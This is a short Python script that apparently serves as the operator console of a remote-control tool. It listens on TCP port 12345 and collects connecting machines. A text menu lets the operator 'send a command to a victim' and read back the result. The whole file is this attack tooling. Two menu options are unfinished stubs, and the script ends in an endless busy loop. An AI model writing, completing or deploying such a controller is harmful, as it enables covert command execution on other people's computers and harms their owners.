import socket
import threading
from typing import List



HOST=socket.gethostbyname(socket.gethostname())
PORT=12345
FORMAT='UTF-8'
list_of_clients:List[socket.socket]=[]
client_counter=0



def connection_accepter():
    global client_counter
    print("server is starting")
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((HOST,PORT))
    server.listen()
    print(f"server is running on ip {HOST}")
    while True:
        conn,addr=server.accept()
        print(f"the new client is {addr}")
        list_of_clients.append(conn)
        client_counter+=1
        print(f"the number of active connection is {client_counter}")



def showing_menu():
    print("1.show the number of connectiones")
    print("2.send a command to a victim")
    print("3.send all users a command")
    print("4.exit")



def getting_a_command():
    print("entre a command to send to victim")
    command=input()
    return command



def getting_the_user_index():
    print("enter the user's number to send the massage")
    index=int(input())
    return index



def sending_the_command(index:int,massage:str):
    global list_of_clients
    print(f'the sent massage is {massage} to client number {index+1}')
    temp=list_of_clients[index]
    temp.sendall(massage.encode(FORMAT))



def reciving_the_result(index:int):
    global list_of_clients
    temp=list_of_clients[index]
    data=temp.recv(1024).decode(FORMAT)
    print(data)



def program_handler():
    print("welcome to the menu\n\n\n")
    end_of_program=False
    while not end_of_program:
        showing_menu()
        choice=int(input())
        if(choice==1):
            print(client_counter)
        if(choice==2):
            comm=getting_a_command()
            ind=getting_the_user_index()
            sending_the_command(ind-1,comm)
            reciving_the_result(ind-1)
        if(choice==3):
            pass
        if(choice==4):
            pass



def start():
    v=0
    connection_thread=threading.Thread(target=connection_accepter)
    connection_thread.start()
    handeling_thread=threading.Thread(target=program_handler)
    handeling_thread.start()

    x=0
    while 1:
        x=x+1
    
    
    
start()